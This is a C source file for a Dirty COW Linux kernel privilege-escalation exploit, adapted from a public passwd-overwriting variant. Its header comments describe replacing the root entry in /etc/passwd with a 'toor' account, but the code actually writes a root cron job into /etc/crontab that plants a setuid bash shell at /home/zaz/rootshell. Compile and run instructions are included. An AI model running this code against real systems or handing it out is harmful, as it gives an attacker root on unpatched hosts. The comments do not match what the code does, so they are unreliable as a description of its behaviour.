//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "toor".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty_crontab.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty"
//
// Afterwards, you can either "su toor" or "ssh toor@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "firefart" Mehlmauer
// https://firefart.at
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/crontab";
const char *backup_filename = "/tmp/crontab.bak";

pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg)
{
	int i, c = 0;
	void *map = arg;
	for(i = 0; i < 200000000; i++)
		c += madvise(map, st.st_size, MADV_DONTNEED);
	printf("madvise %d\n\n", c);
	return NULL;
}

int copy_file(const char *from, const char *to)
{
	if (access(to, F_OK) != -1)
		return (printf("File %s already exists! Please delete it and run again\n", to), 1);

	char ch;
	FILE *source, *target;

	source = fopen(from, "r");
	if(source == NULL)
		return (printf("Failed to open %s\n", from), 1);
	target = fopen(to, "w");
	if(target == NULL)
		return (printf("Failed to open %s\n", to), 1);

	while((ch = fgetc(source)) != EOF)
		fputc(ch, target);

	printf("%s successfully backed up to %s\n", from, to);
	fclose(source);
	fclose(target);
	return (0);
}

int main(int argc, char *argv[])
{
	// backup file
	if (copy_file(filename, backup_filename))
		exit(1);

	unsigned char buf[] = "* * * * * root cp /bin/bash /home/zaz/rootshell && chmod 4755 /home/zaz/rootshell\n#";
	unsigned int buf_len = strlen(buf);

	int fd = open(filename, O_RDONLY);
	fstat(fd, &st);
	void *map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, fd, 0);
	printf("mmap: %lx\n",(unsigned long)map); 
	pid = fork();
	if (pid)
	{
		waitpid(pid, NULL, 0);
		int u, i, o, c = 0;
		int max_i = 10000/buf_len;
		for(i = 0; i < max_i; i++)
		{
			for(o = 0; o < buf_len; o++)
			{
				for(u = 0; u < 10000; u++)
					c += ptrace(PTRACE_POKETEXT, pid, map + o, *((long*)(buf + o)));
			}
		}
		printf("ptrace %d\n",c);
	}
	else
	{
		pthread_create(&pth, NULL, madviseThread, map);
		ptrace(PTRACE_TRACEME);
		kill(getpid(), SIGSTOP);
		pthread_join(pth,NULL);
	}

	printf("Done! Check %s to see if it was modified.\n", filename);
	printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n", backup_filename, filename);
	return 0;
}